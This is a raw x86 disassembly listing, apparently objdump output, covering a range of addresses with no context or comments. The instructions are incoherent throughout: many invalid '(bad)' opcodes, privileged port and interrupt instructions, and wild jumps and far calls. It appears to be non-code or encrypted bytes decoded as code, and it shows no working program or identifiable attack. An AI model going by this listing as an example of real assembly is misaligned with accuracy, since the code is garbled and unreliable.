  4234bf:	or     DWORD PTR [edi+edi*4],edi
  4234c2:	xchg   DWORD PTR [ecx-0x1f],edi
  4234c5:	iret   
  4234c6:	add    ecx,0x6
  4234c9:	std    
  4234ca:	stos   BYTE PTR es:[edi],al
  4234cb:	sub    DWORD PTR [eax-0x66],0x712b4688
  4234d2:	into   
  4234d3:	icebp  
  4234d4:	lods   eax,DWORD PTR ds:[esi]
  4234d5:	add    eax,0x94b6ca6e
  4234da:	xor    al,0xcc
  4234dc:	clc    
  4234dd:	das    
  4234de:	jns    0x423470
  4234e0:	sub    ecx,edx
  4234e2:	cmp    eax,0x31f22718
  4234e7:	and    al,0xad
  4234e9:	fcmovu st,st(7)
  4234eb:	ficomp DWORD PTR [ebp+eax*1+0x74]
  4234ef:	xchg   BYTE PTR [esi+0xfbaba95],ah
  4234f5:	ins    BYTE PTR es:[edi],dx
  4234f6:	mov    ecx,0x8b244391
  4234fb:	cmp    bl,BYTE PTR ds:0x75caa796
  423501:	cwde   
  423502:	rcr    BYTE PTR [edi-0x48],1
  423505:	ds or  esi,ecx
  423508:	jp     0x42357e
  42350a:	mov    DWORD PTR [eiz*2-0x3e422daf],ebx
  423511:	or     eax,0x992e189b
  423516:	rcl    DWORD PTR [ecx+ebp*1-0x264d1b82],0xfc
  42351e:	int    0x46
  423520:	mov    eax,0xfc63a72e
  423525:	lods   eax,DWORD PTR ds:[esi]
  423526:	mov    ebx,DWORD PTR [edx+eax*8]
  423529:	cld    
  42352a:	jb     0x423548
  42352c:	nop
  42352d:	ret    0xf39d
  423530:	fstp   QWORD PTR [esi+edi*2+0x7facd4d]
  423537:	fld    QWORD PTR [eax+ecx*4-0x58c1152f]
  42353e:	in     al,0xd7
  423540:	inc    edx
  423541:	or     al,0xad
  423543:	pop    eax
  423544:	inc    edi
  423545:	fdivr  DWORD PTR [ebx-0x193e1832]
  42354b:	xor    BYTE PTR [edi+0x5f],dl
  42354e:	sub    cl,ah
  423550:	push   ebx
  423551:	fcomp  QWORD PTR [eax+esi*4]
  423554:	shl    DWORD PTR [esi-0x12ae148c],1
  42355a:	and    BYTE PTR [edi+0x28],dl
  42355d:	inc    ebx
  42355e:	loope  0x4235af
  423560:	pop    esi
  423561:	push   ebp
  423562:	lds    esp,FWORD PTR [ebp+0x760d7cdf]
  423568:	sbb    ecx,DWORD PTR [eax+edi*2]
  42356b:	xor    eax,0xf027009c
  423570:	inc    esp
  423571:	and    esi,DWORD PTR [ebx]
  423573:	leave  
  423574:	push   ss
  423575:	mov    al,ds:0x3d0a3f03
  42357a:	mov    WORD PTR [eax],gs
  42357c:	sahf   
  42357d:	loope  0x4235bb
  42357f:	dec    edi
  423580:	xchg   ebx,eax
  423581:	hlt    
  423582:	pop    eax
  423583:	xchg   esi,eax
  423584:	push   ss
  423585:	(bad)  
  423586:	loopne 0x42358b
  423588:	mov    ebx,0x1b822be7
  42358d:	sbb    BYTE PTR [edi+eiz*2-0x60],dl
  423591:	push   es
  423592:	stos   DWORD PTR es:[edi],eax
  423593:	inc    ebp
  423594:	sbb    DWORD PTR [edi+0x5e17cb9f],0xffffffe4
  42359b:	cmp    DWORD PTR [esi+0x71],edx
  42359e:	ret    
  42359f:	push   0x45
  4235a1:	push   edi
  4235a2:	xlat   BYTE PTR ds:[ebx]
  4235a3:	addr16 mov edi,0xc0980554
  4235a9:	mov    DWORD PTR [ebp+0x7a],ebx
  4235ac:	cmp    al,0xd1
  4235ae:	fimul  WORD PTR [edx]
  4235b0:	dec    ebp
  4235b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235b2:	(bad)  
  4235b3:	cmc    
  4235b4:	cmp    esi,DWORD PTR [edi]
  4235b6:	jecxz  0x4235f0
  4235b8:	lea    edx,[edx+0x7d]
  4235bb:	inc    esi
  4235bc:	adc    ebx,ebx
  4235be:	jecxz  0x4235bf
  4235c0:	int3   
  4235c1:	pop    ss
  4235c2:	data16 int 0xee
  4235c5:	sub    ecx,DWORD PTR [edx+0x3d1e0b22]
  4235cb:	adc    al,0x8
  4235cd:	inc    di
  4235cf:	pop    edi
  4235d0:	mov    al,BYTE PTR [eax+0x25]
  4235d3:	mov    cs:0x6e003d2,eax
  4235d9:	and    DWORD PTR [edx-0x1869b8c0],ebp
  4235df:	sub    edx,esp
  4235e1:	nop
  4235e2:	fistp  QWORD PTR [esi+ebx*4-0x5bd08627]
  4235e9:	stos   BYTE PTR es:[edi],al
  4235ea:	repz pop es
  4235ec:	cwde   
  4235ed:	mov    edx,0x1a691ca9
  4235f2:	cmp    esp,edx
  4235f4:	and    dl,ah
  4235f6:	add    BYTE PTR [esi],bh
  4235f8:	lods   al,BYTE PTR ds:[esi]
  4235f9:	sub    bh,BYTE PTR [esi]
  4235fb:	hlt    
  4235fc:	sbb    DWORD PTR [eax+0x2eb29d5a],ebx
  423602:	pushf  
  423603:	inc    ebx
  423604:	das    
  423605:	stos   BYTE PTR es:[edi],al
  423606:	(bad)  
  423607:	lahf   
  423608:	sub    DWORD PTR [ebx+0x67],ebp
  42360b:	and    BYTE PTR [ebx-0x5d],bh
  42360e:	and    BYTE PTR [edi+0x48e3dc3a],0x88
  423615:	std    
  423616:	ds or  eax,0xeb6f500d
  42361c:	mov    ch,0xf8
  42361e:	push   ebp
  42361f:	xlat   BYTE PTR cs:[ebx]
  423621:	je     0x42368d
  423623:	cmp    DWORD PTR [esi-0x7a],edx
  423626:	adc    al,0x2c
  423628:	lods   al,BYTE PTR ds:[esi]
  423629:	mov    ch,0x5b
  42362b:	pop    ebp
  42362c:	enter  0xcd90,0x38
  423630:	icebp  
  423631:	cmp    BYTE PTR [esi-0x32f9511c],bl
  423637:	and    DWORD PTR [esi],eax
  423639:	loop   0x4235f6
  42363b:	mov    al,ds:0xd1fc5bf
  423640:	int    0x86
  423642:	xchg   edi,eax
  423643:	(bad)  
  423644:	push   cs
  423645:	stc    
  423646:	xchg   edi,eax
  423647:	cmp    ch,BYTE PTR [ebp-0x5d1090ad]
  42364d:	test   eax,0x69025a46
  423652:	mov    ah,0x75
  423654:	icebp  
  423655:	pop    ss
  423656:	mov    bl,0x7
  423658:	push   edx
  423659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42365a:	pop    edx
  42365b:	mov    ds:0x16574529,eax
  423660:	xor    BYTE PTR [ebx+0x67],ah
  423663:	loopne 0x423691
  423665:	dec    edi
  423666:	imul   edi,DWORD PTR [esi-0x72990441],0x44
  42366d:	push   cs
  42366e:	cmp    DWORD PTR ds:0xf17e05ce,ecx
  423674:	inc    edx
  423675:	out    0x96,al
  423677:	imul   edx,eax
  42367a:	stos   BYTE PTR es:[edi],al
  42367b:	cmp    al,0x9
  42367d:	cmp    BYTE PTR ds:0x99847ea0,ch
  423683:	jbe    0x423629
  423685:	mov    dl,0x8
  423687:	repnz mov edi,ebp
  42368a:	inc    ebp
  42368b:	loop   0x42366e
  42368d:	(bad)  
  42368e:	or     BYTE PTR [esi-0x7e1d5a50],al
  423694:	je     0x42365e
  423696:	jnp    0x423666
  423698:	das    
  423699:	faddp  st(4),st
  42369b:	lods   al,BYTE PTR ds:[esi]
  42369c:	dec    esp
  42369d:	in     al,dx
  42369e:	push   ebx
  42369f:	xor    BYTE PTR [ebx+0x51d7c1ae],ah
  4236a5:	jecxz  0x42368e
  4236a7:	sbb    al,bl
  4236a9:	cli    
  4236aa:	pop    eax
  4236ab:	aas    
  4236ac:	loopne 0x423668
  4236ae:	jnp    0x423728
  4236b0:	aam    0xda
  4236b2:	(bad)  
  4236b3:	shl    DWORD PTR [ebx],1
  4236b5:	mov    edi,0x775f6f2
  4236ba:	and    BYTE PTR [eax+0x66],bh
  4236bd:	(bad)  
  4236be:	mov    esi,0x944fea09
  4236c3:	fisubr DWORD PTR [esi]
  4236c5:	or     bh,BYTE PTR [ebp+0x5ea07edb]
  4236cb:	adc    BYTE PTR [edx+0x7cca7bf9],dl
  4236d1:	cwde   
  4236d2:	push   ebx
  4236d3:	loopne 0x423665
  4236d5:	sbb    eax,0xc9408d14
  4236da:	and    DWORD PTR [eax+0x28177dd4],0xfffffffa
  4236e1:	gs fcmovnb st,st(6)
  4236e4:	mov    ds:0x824d8b02,eax
  4236e9:	fwait
  4236ea:	retf   
  4236eb:	mov    eax,0xcfc2b067
  4236f0:	pop    ebx
  4236f1:	adc    al,0xca
  4236f3:	and    eax,0x3eb99e92
  4236f8:	(bad)  
  4236f9:	xlat   BYTE PTR ds:[ebx]
  4236fa:	fwait
  4236fb:	stos   BYTE PTR es:[edi],al
  4236fc:	mov    ds:0x6bb623e,eax
  423701:	inc    esp
  423702:	pop    esp
  423703:	in     al,dx
  423704:	add    DWORD PTR [edx],0x17
  423707:	scas   eax,DWORD PTR es:[edi]
  423708:	repz das 
  42370a:	pop    ds
  42370b:	mov    esi,0xa70205a7
  423710:	mov    bl,0x44
  423712:	sub    ch,BYTE PTR [ebx-0x1ac7a966]
  423718:	jns    0x4236bb
  42371a:	test   al,0x6f
  42371c:	daa    
  42371d:	xchg   ebx,eax
  42371e:	add    ebx,esp
  423720:	outs   dx,DWORD PTR ds:[esi]
  423721:	mov    esp,DWORD PTR ds:0xde1a3569
  423727:	scas   eax,DWORD PTR es:[edi]
  423728:	xchg   esp,eax
  423729:	push   ebp
  42372a:	and    al,0x1d
  42372c:	hlt    
  42372d:	call   0x277e2962
  423732:	in     al,dx
  423733:	shr    ecx,cl
  423735:	test   al,0x11
  423737:	push   ebp
  423738:	pusha  
  423739:	dec    edx
  42373a:	mov    ebx,0x33d4f603
  42373f:	psubsw mm3,QWORD PTR [esi]
  423742:	and    BYTE PTR [ebp-0x2],dl
  423745:	cmc    
  423746:	and    eax,0x26d4712e
  42374b:	leave  
  42374c:	je     0x423730
  42374e:	and    eax,DWORD PTR [edx+0x60]
  423751:	pusha  
  423752:	and    BYTE PTR [ecx+edi*2+0x43],0xb9
  423757:	or     edi,DWORD PTR [esi]
  423759:	xchg   BYTE PTR [ebx-0x39bb282d],ch
  42375f:	in     al,0x2d
  423761:	int    0xc4
  423763:	and    eax,0xddc0ef72
  423768:	fs sbb dh,ah
  42376b:	mov    esp,0x81217459
  423770:	int    0xae
  423772:	cwde   
  423773:	call   0xb36b:0x8c575f15
  42377a:	sub    BYTE PTR [ebp+0x240ea229],ah
  423780:	mov    ah,0xbe
  423782:	mov    ch,0xb0
  423784:	cmp    DWORD PTR [eax+0x166084d],eax
  42378a:	inc    edi
  42378b:	cld    
  42378c:	call   0xe1e2:0xb70d7adb
  423793:	inc    edx
  423794:	test   DWORD PTR [edi+0x7de1e5ff],edi
  42379a:	pushf  
  42379b:	cmp    eax,0xdeb6fb6a
  4237a0:	mov    eax,0x96292ca9
  4237a5:	popf   
  4237a6:	mov    bh,0x2e
  4237a8:	dec    ebx
  4237a9:	pop    ecx
  4237aa:	and    esi,ecx
  4237ac:	pusha  
  4237ad:	pop    es
  4237ae:	adc    ebp,DWORD PTR [edx]
  4237b0:	inc    esi
  4237b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237b2:	dec    ebx
  4237b3:	jle    0x423800
  4237b5:	les    esp,FWORD PTR [ebx+0x389f9bd2]
  4237bb:	push   0x6a8f31e4
  4237c0:	fs in  eax,dx
  4237c2:	add    esp,ecx
  4237c4:	cld    
  4237c5:	mov    al,ds:0x22c1df3
  4237ca:	sbb    BYTE PTR [ebx-0x211204c4],dl
  4237d0:	xchg   ebx,eax
  4237d1:	fs jo  0x42383d
  4237d4:	out    0x3d,eax
  4237d6:	lods   al,BYTE PTR ds:[esi]
  4237d7:	xchg   BYTE PTR [edx-0x76],ch
  4237da:	sub    eax,0x737040ac
  4237df:	cmp    ch,BYTE PTR [eax]
  4237e1:	aaa    
  4237e2:	cmp    BYTE PTR [ecx+0x3fdde197],bh
  4237e8:	bound  esp,QWORD PTR [esi+0x1b]
  4237eb:	cmp    eax,0xc626d19f
  4237f0:	mov    dl,0x7d
  4237f2:	xor    al,0xea
  4237f4:	into   
  4237f5:	xchg   DWORD PTR [ebp-0x182d4e73],ecx
  4237fb:	or     al,0x10
  4237fd:	sub    eax,0xf6fc43e9
  423802:	int3   
  423803:	aam    0x39
  423805:	in     eax,dx
  423806:	fcmovb st,st(7)
  423808:	cmp    edx,ecx
  42380a:	je     0x423828
  42380c:	jno    0x4237a7
  42380e:	lods   eax,DWORD PTR ds:[esi]
  42380f:	mov    dl,0x9b
  423811:	xchg   esi,eax
  423812:	mov    ebp,0x149368fa
  423817:	sbb    edx,ebx
  423819:	sub    dh,BYTE PTR [esi+0x7427efbc]
  42381f:	fiadd  WORD PTR [ebp-0x667d2853]
  423825:	jg     0x423811
  423827:	push   edx
  423828:	test   DWORD PTR ss:[ebx],ebx
  42382b:	sbb    BYTE PTR [edx+0x12],cl
  42382e:	call   0xfdad:0xaae0d93e
  423835:	mov    WORD PTR [edi-0x5d8329af],ss
  42383b:	mov    WORD PTR [esi-0x2c],es
  42383e:	inc    edx
  42383f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423840:	sub    dh,BYTE PTR [edi-0x2689126d]
  423846:	sub    al,BYTE PTR [eax-0x20f9094a]
  42384c:	adc    DWORD PTR [eax],esi
  42384e:	sub    edi,ebx
  423850:	dec    ebp
  423851:	adc    al,0x91
  423853:	aad    0x93
  423855:	sbb    DWORD PTR [edx],0xec210886
  42385b:	xchg   ch,cl
  42385d:	aaa    
  42385e:	mov    esp,DWORD PTR [edx]
  423860:	xor    DWORD PTR [ecx+0x3b47417f],eax
  423866:	outs   dx,DWORD PTR ds:[esi]
  423867:	and    ch,cl
  423869:	sub    DWORD PTR [ebp-0x4d],eax
  42386c:	loopne 0x4238cf
  42386e:	fistp  QWORD PTR [ebx+0x6f1effee]
  423874:	fimul  DWORD PTR fs:[ebx+0x5ad00e01]
  42387b:	sbb    ah,0xc1
  42387e:	lods   al,BYTE PTR ds:[esi]
  42387f:	loopne 0x42386b
  423881:	xor    ch,BYTE PTR [esi-0x7c]
  423884:	int3   
  423885:	mov    bl,0xea
  423887:	xchg   dl,dl
  423889:	test   eax,0xb246893f
  42388e:	push   edi
  42388f:	fisubr DWORD PTR [ebp-0x78d85ade]
  423895:	xor    bh,BYTE PTR [esi]
  423897:	sub    BYTE PTR [esi+0x67febef],dh
  42389d:	cmp    DWORD PTR [eax],eax
  42389f:	mov    al,0xc4
  4238a1:	into   
  4238a2:	push   0xef72b2ef
  4238a7:	sub    eax,0xc91027c8
  4238ac:	mov    al,0x73
  4238ae:	repz cli 
  4238b0:	mov    al,BYTE PTR [esi+0x46610c5a]
  4238b6:	sbb    DWORD PTR [esi+eax*1+0x16],ecx
  4238ba:	mov    eax,cs
  4238bc:	mov    ds:0x21a9e034,al
  4238c1:	xor    BYTE PTR [esi],ah
  4238c3:	cld    
  4238c4:	jecxz  0x4238a8
  4238c6:	ja     0x42389c
  4238c8:	inc    eax
  4238c9:	mov    ch,0x4c
  4238cb:	ins    BYTE PTR es:[edi],dx
  4238cc:	mov    esi,0x154daa4c
  4238d1:	sub    BYTE PTR [edi],0xba
  4238d4:	cld    
  4238d5:	add    cl,BYTE PTR [edi-0x36b867d1]
  4238db:	les    edi,FWORD PTR ds:0x6482c639
  4238e1:	sbb    dl,bl
  4238e3:	mov    ecx,DWORD PTR ds:0x1435fa75
  4238e9:	jbe    0x4238d1
  4238eb:	xchg   ecx,ebx
  4238ed:	outs   dx,DWORD PTR ds:[esi]
  4238ee:	fbstp  TBYTE PTR [ecx+ecx*4+0x73]
  4238f2:	mov    eax,ds:0x2e6d4e63
  4238f7:	out    0x26,eax
  4238f9:	loopne 0x423891
  4238fb:	sar    DWORD PTR [ebx+0x6b],cl
  4238fe:	ret    0xeaf
  423901:	jl     0x423900
  423903:	imul   ebp,DWORD PTR [eax-0x1a3bf7d5],0x34
  42390a:	mov    edx,0x68cdaaa8
  42390f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423910:	iret   
  423911:	dec    edx
  423912:	pop    ebp
  423913:	xchg   ecx,eax
  423914:	push   ecx
  423915:	jns    0x42396c
  423917:	xchg   edi,eax
  423918:	pop    edi
  423919:	push   0xd40c9598
  42391e:	int3   
  42391f:	mov    al,0xca
  423921:	jno    0x423936
  423923:	aam    0x71
  423925:	or     edx,DWORD PTR ds:0x50ca9875
  42392b:	push   es
  42392c:	int    0x9a
  42392e:	into   
  42392f:	into   
  423930:	ss ror edi,1
  423933:	inc    esi
  423934:	fimul  WORD PTR [ebx+0x7e8cef18]
  42393a:	push   edx
  42393b:	xchg   DWORD PTR [edi-0x39],ebp
  42393e:	inc    eax
  42393f:	add    al,0x8e
  423941:	shl    ecx,cl
  423943:	cwde   
  423944:	mov    bl,0x4e
  423946:	sbb    eax,0xb30bc1a1
  42394b:	dec    ecx
  42394c:	dec    esp
  42394d:	pop    ebx
  42394e:	pusha  
  42394f:	data16 addr16 jnp 0x423924
  423953:	pop    edi
  423954:	xchg   ebx,eax
  423955:	xor    al,0x97
  423957:	sbb    esp,edi
  423959:	jae    0x423902
  42395b:	xchg   ebx,eax
  42395c:	fidivr WORD PTR [edx]
  42395e:	mov    ch,0x3c
  423960:	test   al,0xb9
  423962:	jae    0x4238fc
  423964:	mov    ah,0xd2
  423966:	cmp    al,0x7
  423968:	repz repz sub DWORD PTR [edx+eax*1],edi
  42396d:	ins    BYTE PTR es:[edi],dx
  42396e:	xor    dh,dh
  423970:	scas   eax,DWORD PTR es:[edi]
  423971:	jg     0x4239ea
  423973:	jmp    0x7d8301e3
  423978:	pop    ebx
  423979:	fadd   DWORD PTR ds:0xe95d2d8d
  42397f:	cs dec ecx
  423981:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  423983:	enter  0x632c,0x3
  423987:	dec    ebx
  423988:	jmp    0xa0f94e44
  42398d:	and    eax,0x24e30cf2
  423992:	call   0x795f:0xc8da74df
  423999:	mov    dl,0x66
  42399b:	icebp  
  42399c:	shr    BYTE PTR fs:[ebp-0x4b95a742],cl
  4239a3:	jae    0x4239e7
  4239a5:	stc    
  4239a6:	dec    BYTE PTR [edi-0x32017865]
  4239ac:	mov    ch,0xf1
  4239ae:	aam    0x2c
  4239b0:	lods   al,BYTE PTR ds:[esi]
  4239b1:	dec    eax
  4239b2:	pop    ecx
  4239b3:	iret   
  4239b4:	push   eax
  4239b5:	mov    al,0x91
  4239b7:	sub    ecx,DWORD PTR [esi]
  4239b9:	cmp    BYTE PTR [edi+eiz*4-0x3c704a7],0xe3
  4239c1:	sbb    BYTE PTR [ebx],bl
  4239c3:	and    DWORD PTR [bx+di],0xffffff8d
  4239c7:	ficomp DWORD PTR [ebx+0x204686e3]
  4239cd:	push   es
  4239ce:	adc    cl,BYTE PTR [edx+0x16029016]
  4239d4:	mov    dl,0xa7
  4239d6:	ins    BYTE PTR es:[edi],dx
  4239d7:	nop
  4239d8:	cmp    dl,BYTE PTR [ebx-0x41]
  4239db:	mov    ds:0x344a9079,eax
  4239e0:	pop    edi
  4239e1:	test   bl,bh
  4239e3:	pop    eax
  4239e4:	or     DWORD PTR [eax+0x4c],ecx
  4239e7:	imul   ebx,edi,0x7e986ea9
  4239ed:	inc    DWORD PTR [edx*1-0x4d059da5]
  4239f4:	out    0xf5,al
  4239f6:	stos   BYTE PTR es:[edi],al
  4239f7:	pop    eax
  4239f8:	mov    esp,0x22c80cb3
  4239fd:	mov    ds:0x9a4f64c9,al
  423a02:	push   eax
  423a03:	std    
  423a04:	inc    edi
  423a05:	mov    cl,BYTE PTR [ebx]
  423a07:	int    0xb9
  423a09:	fprem1 
  423a0b:	sahf   
  423a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a0d:	sbb    edi,edx
  423a0f:	sti    
  423a10:	aam    0x6f
  423a12:	mov    bl,cl
  423a14:	xor    bl,cl
  423a16:	push   eax
  423a17:	mov    ecx,0x4ffb2b0e
  423a1c:	lock mov edx,0x562a6050
  423a22:	ret    
  423a23:	sub    al,0x23
  423a25:	jno    0x423a42
  423a27:	pop    esi
  423a28:	lods   al,BYTE PTR ds:[esi]
  423a29:	retf   0xa3d6
  423a2c:	pusha  
  423a2d:	and    bl,dh
  423a2f:	and    DWORD PTR ds:[esp+ebx*8],esp
  423a33:	xor    cl,dh
  423a35:	xchg   edx,eax
  423a36:	ror    DWORD PTR [ecx],0x57
  423a39:	mov    eax,0x9126735d
  423a3e:	ins    BYTE PTR es:[edi],dx
  423a3f:	jmp    0x17120082
  423a44:	jg     0x423a40
  423a46:	stos   DWORD PTR es:[edi],eax
  423a47:	test   eax,0x38dcc6f8
  423a4c:	shl    BYTE PTR [ebx],0x12
  423a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a50:	push   0x42ac3f9a
  423a55:	mov    al,ds:0x5a011f30
  423a5a:	push   ebx
  423a5b:	xchg   ebx,eax
  423a5c:	aam    0x94
  423a5e:	mov    bl,0x3c
  423a60:	adc    BYTE PTR [eax+0x55839100],al
  423a66:	inc    esp
  423a67:	pop    edi
  423a68:	ficomp WORD PTR [eax+0x6c]
  423a6b:	fs jne 0x4239f6
  423a6e:	xor    al,0x13
  423a70:	jne    0x423a50
  423a72:	and    cl,dl
  423a74:	pusha  
  423a75:	dec    ecx
  423a76:	repz cld 
  423a78:	or     BYTE PTR [edi+0x623fb65a],ch
  423a7e:	inc    ecx
  423a7f:	aam    0x3d
  423a81:	popf   
  423a82:	aad    0x4f
  423a84:	dec    esi
  423a85:	dec    ecx
  423a86:	outs   dx,BYTE PTR ds:[esi]
  423a87:	jp     0x423a11
  423a89:	xchg   ecx,eax
  423a8a:	arpl   di,si
  423a8c:	fiadd  WORD PTR [edi+0x76]
  423a8f:	pop    ecx
  423a90:	std    
  423a91:	mov    edi,0x1ee41cd1
  423a96:	mov    ecx,0xb53ba9c9
  423a9b:	popa   
  423a9c:	in     eax,0x2f
  423a9e:	push   ecx
  423a9f:	push   ecx
  423aa0:	test   eax,0xb8e5682a
  423aa5:	jae    0x423a63
  423aa7:	fwait
  423aa8:	add    bl,BYTE PTR [esi]
  423aaa:	push   ebx
  423aab:	into   
  423aac:	inc    ebx
  423aad:	pop    eax
  423aae:	sub    edx,DWORD PTR [ebp-0x233dde37]
  423ab4:	pop    edx
  423ab5:	mov    bh,0xa6
  423ab7:	mov    dl,0x73
  423ab9:	mov    bl,0x28
  423abb:	pop    edi
  423abc:	retf   0xd4b0
  423abf:	daa    
  423ac0:	mov    ds:0xdf4a9270,eax
  423ac5:	fdiv   QWORD PTR [ebp-0x67]
  423ac8:	scas   al,BYTE PTR es:[edi]
  423ac9:	ret    
  423aca:	cmp    ch,ah
  423acc:	sub    bl,dl
  423ace:	sbb    eax,0x26
  423ad1:	pop    ss
  423ad2:	mov    ebp,0xbc5f9b5a
  423ad7:	push   ecx
  423ad8:	mov    dl,0xd0
  423ada:	aaa    
  423adb:	cs (bad) 
  423add:	xchg   edx,eax
  423ade:	sbb    DWORD PTR [ebx],eax
  423ae0:	ins    DWORD PTR es:[edi],dx
  423ae1:	in     al,dx
  423ae2:	addr16 inc ebp
  423ae4:	ja     0x423aa5
  423ae6:	sbb    al,0x6a
  423ae8:	popa   
  423ae9:	test   eax,0xdac9033d
  423aee:	sub    cl,bh
  423af0:	mov    ecx,0xd0618229
  423af5:	int3   
  423af6:	jg     0x423a86
  423af8:	cmp    edi,ecx
  423afa:	or     eax,0x80ac8a0b
  423aff:	mov    WORD PTR [edi+0x76],fs
  423b02:	addr16 mov esi,0xaa5eee6d
  423b08:	cwde   
  423b09:	xchg   esp,eax
  423b0a:	cmc    
  423b0b:	fwait
  423b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b0d:	xchg   edi,eax
  423b0e:	inc    ax
  423b10:	mov    ss,ecx
  423b12:	pop    es
  423b13:	jno    0x423abb
  423b15:	mov    ebp,0x5124110d
  423b1a:	cdq    
  423b1b:	jle    0x423b4d
  423b1d:	lea    edx,[eax+edx*4-0x1e1ca98]
  423b24:	outs   dx,DWORD PTR ds:[esi]
  423b25:	call   0xeef7da76
  423b2a:	cmp    al,0x14
  423b2c:	lods   eax,DWORD PTR ds:[esi]
  423b2d:	sub    al,0xad
  423b2f:	popf   
  423b30:	retf   0x56df
  423b33:	fdivr  QWORD PTR [ebx]
  423b35:	inc    eax
  423b36:	inc    ebp
  423b37:	nop
  423b38:	bound  edi,QWORD PTR [edx+0x4bc347e2]
  423b3e:	call   0x39ee9a78
  423b43:	icebp  
  423b44:	push   esp
  423b45:	stos   DWORD PTR es:[edi],eax
  423b46:	rcl    DWORD PTR [esi+0x7784658b],cl
  423b4c:	sbb    DWORD PTR [edx+0x5d],ebx
  423b4f:	aaa    
  423b50:	je     0x423bbc
  423b52:	sub    dl,BYTE PTR [ecx]
  423b54:	es aas 
  423b56:	fadd   DWORD PTR [esi]
  423b58:	mov    ah,0x7c
  423b5a:	fild   DWORD PTR [edi+0x7]
  423b5d:	in     eax,0x7
  423b5f:	movntps XMMWORD PTR [edx],xmm3
  423b62:	ds or  al,0xbe
  423b65:	aad    0x99
  423b67:	ins    BYTE PTR es:[edi],dx
  423b68:	mov    edx,0x10b050d7
  423b6d:	cmp    eax,0x38288c21
  423b72:	mov    DWORD PTR [esi-0x4a],eax
  423b75:	je     0x423af9
  423b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b78:	dec    edi
  423b79:	ss int 0x65
  423b7c:	je     0x423bbb
  423b7e:	jmp    0x423b49
  423b80:	sbb    edi,DWORD PTR [ebx]
  423b82:	leave  
  423b83:	cmp    ah,dh
  423b85:	data16 ds jae 0x423b3d
  423b89:	repz push eax
  423b8b:	add    edi,DWORD PTR ds:0x9bc36f63
  423b91:	adc    DWORD PTR [eax+0x68],ecx
  423b94:	mov    bl,0xd4
  423b96:	and    ah,BYTE PTR gs:[eax]
  423b99:	sub    al,0x76
  423b9b:	aad    0x2a
  423b9d:	cdq    
  423b9e:	pop    eax
  423b9f:	xchg   edi,eax
  423ba0:	mov    bh,0x36
  423ba2:	inc    ebx
  423ba3:	leave  
  423ba4:	and    al,0x23
  423ba6:	jmp    0x82cc9e14
  423bab:	jnp    0x423bdb
  423bad:	add    edx,DWORD PTR [ecx+0x6bbfb78c]
  423bb3:	pop    ss
  423bb4:	es sub edx,esp
  423bb7:	mov    ds:0xb15832d0,al
  423bbc:	shl    BYTE PTR [edi+0x7ca7b3f3],cl
  423bc2:	cld    
  423bc3:	mov    cl,BYTE PTR [eax]
  423bc5:	push   esi
  423bc6:	push   cs
  423bc7:	xor    bh,BYTE PTR [esi+0x1a]
  423bca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bcb:	sbb    esi,0xe1ae4edc
  423bd1:	add    al,0x9b
  423bd3:	mov    ch,0x23
  423bd5:	inc    edi
  423bd6:	int    0x15
  423bd8:	and    BYTE PTR [esi],0x32
  423bdb:	jns    0x423c42
  423bdd:	test   al,0x88
  423bdf:	sbb    ebx,DWORD PTR [eax+0x59]
  423be2:	jmp    0x610cb02a
  423be7:	fsubr  DWORD PTR [edi+0x1b5e2f2e]
  423bed:	mov    dl,0xe7
  423bef:	imul   edi,DWORD PTR [edx+0x26],0x55
  423bf3:	aaa    
  423bf4:	push   ds
  423bf5:	(bad)  
  423bf7:	fldcw  WORD PTR [edx-0x55447763]
  423bfd:	mov    bl,0xc
  423bff:	fmul   DWORD PTR [ebx-0x40dc0a94]
  423c05:	(bad)  
  423c06:	cmp    eax,0xcf1bbc3d
  423c0b:	xchg   edi,eax
  423c0c:	mov    WORD PTR [eax+ebp*2],cs
  423c0f:	sbb    BYTE PTR [edx-0x305368f0],0x69
  423c16:	push   edi
  423c17:	sub    eax,0x69b94703
  423c1c:	sbb    cl,al
  423c1e:	(bad)  
  423c1f:	jp     0x423c95
  423c21:	or     DWORD PTR [ecx-0x4a],ebp
  423c24:	(bad)  
  423c25:	sti    
  423c26:	nop
  423c27:	je     0x423c83
  423c29:	scas   al,BYTE PTR es:[edi]
  423c2a:	icebp  
  423c2b:	test   eax,0x3734846a
  423c30:	cld    
  423c31:	adc    DWORD PTR [esi+0x565c32f0],0xffffffdd
  423c38:	add    DWORD PTR [esi+0x21],ecx
  423c3b:	icebp  
  423c3c:	mov    bl,0x5f
  423c3e:	cmp    BYTE PTR [ebp-0x65f1c986],ah
  423c44:	push   ds
  423c45:	xor    DWORD PTR [esi-0x6dedcd16],edi
  423c4b:	push   ebp
  423c4c:	into   
  423c4d:	mov    dh,0xb4
  423c4f:	cld    
  423c50:	cmp    al,0xb3
  423c52:	push   ss
  423c53:	int3   
  423c54:	jne    0x423bfa
  423c56:	jle    0x423c6f
  423c58:	lock inc ebp
  423c5a:	popf   
  423c5b:	or     esp,ebx
  423c5d:	jg     0x423ca3
  423c5f:	sbb    eax,edx
  423c61:	js     0x423c64
  423c63:	fucomp st(3)
  423c65:	in     al,dx
  423c66:	mov    cl,0xcb
  423c68:	fsub   DWORD PTR [eax+ebp*8+0x15]
  423c6c:	inc    edi
  423c6d:	stos   DWORD PTR es:[edi],eax
  423c6e:	dec    ecx
  423c6f:	iret   
  423c70:	add    cl,cl
  423c72:	fsubp  st(7),st
  423c74:	mov    bh,0xb9
  423c76:	loopne 0x423ce9
  423c78:	jnp    0x423cc2
  423c7a:	cs (bad) 
  423c7c:	int    0x85
  423c7e:	jle    0x423c5b
  423c80:	xchg   esp,eax
  423c81:	mov    esp,0x9d453f44
  423c86:	leave  
  423c87:	fchs   
  423c89:	pop    ebp
  423c8a:	cmp    BYTE PTR [ebp+0x10],bl
  423c8d:	pop    edi
  423c8e:	sbb    edx,DWORD PTR [edx-0x23]
  423c91:	xchg   esp,eax
